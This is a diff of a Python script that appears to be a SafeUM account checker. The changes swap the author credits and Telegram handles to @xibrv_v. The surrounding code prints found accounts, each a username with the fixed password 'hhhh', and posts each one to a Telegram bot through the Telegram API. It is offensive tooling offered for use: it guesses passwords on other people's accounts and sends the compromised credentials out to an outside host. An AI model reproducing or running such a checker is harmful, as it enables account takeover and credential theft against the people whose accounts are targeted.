@@ -27,8 +27,8 @@ R = '\033[1;31m'
 O = '\x1b[38;5;208m' #برتقالي
 F = '\033[1;32m' #اخضر
 table = Table(title="𝘁𝗼𝗼𝗹 𝗰𝗵𝗲𝗰𝗸 𝘀𝗮𝗳𝗲𝘂𝗺 𝘂𝘀𝗲𝗿 / 𝗽𝗮𝘀𝘀",style="blue")
-table.add_column("[yellow]The Tool By :𓌹 َِ𝗜𝗕َِٓ𝗥َِِ𝗔ٍَِ𝗛َِ𝗜َِ𝗠َ 𓌺",style='green')
-table.add_row("𝗺𝘆 𝘂𝘀𝗲𝗿 𝘁𝗲𝗹𝗲 : @W_B_D",style='green')
+table.add_column("[yellow]The Tool By :- ᎥხᖇᥲɦᎥꪔ .",style='green')
+table.add_row("𝗺𝘆 𝘂𝘀𝗲𝗿 𝘁𝗲𝗹𝗲 : @xibrv_v",style='green')
 table.add_row(" ",style='green')
 table.add_row("𝗺𝘆 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝘁𝗲𝗹𝗲 : nothing",style='purple')
 table.add_row(" ",style='green')
@@ -76,7 +76,7 @@ print(f'''𝗡𝗲𝘄 𝗦𝗮𝗳𝗲𝘂𝗺 𝗔𝗰𝗰𝗼𝘂𝗻𝘁
 〄 𝘂𝘀𝗲𝗿 → {username}
 〄 𝗽𝗮𝘀𝘀 → hhhh
 
-〄 𝗕𝗬 → @W_B_D
+〄 𝗕𝗬 → @xibrv_v
 ''')
 requests.post(f"""https://api.telegram.org/bot{token}/sendmessage?chat_id={ID}&text=
 𝗡𝗲𝘄 𝗦𝗮𝗳𝗲𝘂𝗺 𝗔𝗰𝗰𝗼𝘂𝗻𝘁
@@ -84,5 +84,5 @@ requests.post(f"""https://api.telegram.org/bot{token}/sendmessage?chat_id={ID}&t
 〄 𝘂𝘀𝗲𝗿 → {username}
 〄 𝗽𝗮𝘀𝘀 → hhhh
 
-〄 𝗕𝗬 → @W_B_D
-        ~ Pяσɢяαммεя : @B_6_Q | < 𝗠𝗼𝗱𝗰𝗮 𓏺 𝗧𝗵𝗲 𝗟𝗼𝘀𝘁 🇬🇧 > """)
+〄 𝗕𝗬 → @xibrv_v
+        ~ Pяσɢяαммεя : @xibrv_v | < 𝗠𝗼𝗱𝗰𝗮 𓏺 𝗧𝗵𝗲 𝗟𝗼𝘀𝘁 🇬🇧 > """)
